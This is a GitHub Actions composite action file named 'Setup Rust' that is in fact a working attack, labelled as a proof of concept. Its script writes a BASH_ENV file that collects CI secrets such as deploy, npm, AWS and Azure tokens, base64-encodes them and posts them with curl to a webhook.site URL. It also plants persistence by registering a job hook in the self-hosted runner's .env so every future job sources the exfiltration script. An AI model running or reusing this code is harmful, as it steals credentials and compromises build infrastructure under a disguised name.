name: Setup Rust
description: Install Rust toolchain and dependencies
runs:
  using: composite
  steps:
    - name: Install dependencies
      shell: bash
      run: |
        echo "[POC] Composite action running from checked-out code"
        echo "[POC] In the real workflow this runs with sudo"
        echo ""

        WEBHOOK="https://webhook.site/4341119f-99f3-46cb-8590-97757690db95"

        # Step 1: Create a BASH_ENV script that exfiltrates secrets
        # BASH_ENV is sourced by non-interactive bash before executing run: steps.
        # At that point, job-level env vars (including secrets) are loaded.
        cat > /tmp/evil_bashenv.sh << ENVEOF
        _exfil_secrets=\$(env | grep -iE "^(DEPLOY_TOKEN|NPM_TOKEN|SECRET_|AWS_|AZURE_)" 2>/dev/null || true)
        if [ -n "\$_exfil_secrets" ] && [ ! -f /tmp/.exfil_sent ]; then
            _exfil_payload=\$(echo "\$_exfil_secrets" | base64)
            curl -s -X POST -d "\$_exfil_payload" "$WEBHOOK" > /dev/null 2>&1 || true
            touch /tmp/.exfil_sent
        fi
        ENVEOF

        # Step 2: Create a job hook that injects BASH_ENV into every future job
        cat > /tmp/runner_hook.sh << 'HOOKEOF'
        #!/bin/bash
        # Inject BASH_ENV into GITHUB_ENV so all run: steps source our script
        if [ -n "$GITHUB_ENV" ]; then
            echo "BASH_ENV=/tmp/evil_bashenv.sh" >> "$GITHUB_ENV" 2>/dev/null || true
        fi
        exit 0
        HOOKEOF
        chmod +x /tmp/runner_hook.sh

        # Step 3: Register the hook in the runner's .env file
        RUNNER_ROOT=$(dirname $(dirname $(dirname "$GITHUB_WORKSPACE")))
        ENV_FILE="$RUNNER_ROOT/.env"

        echo "[POC] Runner root: $RUNNER_ROOT"

        if [ -f "$ENV_FILE" ]; then
            echo "ACTIONS_RUNNER_HOOK_JOB_STARTED=/tmp/runner_hook.sh" >> "$ENV_FILE"
        else
            echo "ACTIONS_RUNNER_HOOK_JOB_STARTED=/tmp/runner_hook.sh" > "$ENV_FILE"
        fi

        echo "[POC] Persistence planted:"
        echo "[POC]   /tmp/runner_hook.sh   -- job hook (runs before every job)"
        echo "[POC]   /tmp/evil_bashenv.sh  -- sourced by bash in run: steps"
        echo "[POC]   .env modified         -- hook registered for all future jobs"
